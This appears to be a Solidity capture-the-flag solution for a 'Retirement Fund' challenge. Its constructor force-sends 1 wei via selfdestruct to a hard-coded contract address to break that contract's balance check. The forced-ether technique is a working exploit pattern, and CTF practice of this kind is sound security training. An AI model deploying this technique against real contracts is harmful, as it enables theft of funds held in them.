pragma solidity ^0.4.21;

contract RetirementFundSolution {
    function() public payable { }

    address contractAddress = 0x8aB76fea9Aa88716191d2495b02e2039348739B8;

     function RetirementFundSolution() public payable {
        require(msg.value == 1 wei);
        selfdestruct(contractAddress);
    }
}